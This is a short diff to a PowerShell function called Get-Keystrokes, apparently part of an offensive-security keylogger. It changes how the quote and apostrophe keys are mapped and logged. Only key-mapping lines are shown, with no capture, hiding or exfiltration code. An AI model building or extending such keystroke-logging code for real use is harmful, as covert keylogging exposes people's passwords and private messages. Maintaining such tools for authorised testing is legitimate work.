@@ -214,7 +214,7 @@ function Get-Keystrokes {
                         111 { $Key = "/" }
                     }
                 }
-                elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 221)) {                      
+                elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {                      
                     if ($Shift) {                           
                         switch ($vKey.value__) { # Shiftable characters
                             48 { $Key = ')' }
@@ -237,7 +237,7 @@ function Get-Keystrokes {
                             219 { $Key = '{' }
                             220 { $Key = '|' }
                             221 { $Key = '}' }
-                            222 { $Key = '"' }
+                            222 { $Key = '<Double Quotes>' }
                         }
                     }
                     else {                           
@@ -262,7 +262,7 @@ function Get-Keystrokes {
                             219 { $Key = '[' }
                             220 { $Key = '\' }
                             221 { $Key = ']' }
-                            222 { $Key = "`'" }
+                            222 { $Key = '<Single Quote>' }
                         }
                     }
                 }
